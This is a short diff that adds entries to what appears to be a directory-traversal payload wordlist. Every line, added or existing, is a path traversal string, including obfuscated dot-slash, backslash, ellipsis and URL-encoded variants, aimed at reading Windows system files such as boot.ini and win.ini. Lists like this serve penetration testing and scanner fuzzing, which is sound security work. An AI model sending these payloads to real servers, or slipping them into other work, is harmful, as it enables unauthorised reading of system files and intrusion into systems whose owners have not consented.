@@ -4,6 +4,12 @@
 ..\../..\../boot.ini
 ..\../..\../..\../..\../boot.ini
 \…..\\\…..\\\…..\\\
+/.\.\.\.\.\.\winnt\win.ini
+././windows/win.ini
+.//.//.//.//.//boot.ini
+.\./.\./boot.ini
+.\./.\./.\./.\./boot.ini
+\….\\\….\\\….\\\
 %2e%2e%2f%2e%2e%2fwindows/win.ini
 %2e%2e%2f/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/boot.ini
 ..\%2e%2e%2f..\%2e%2e%2fboot.ini
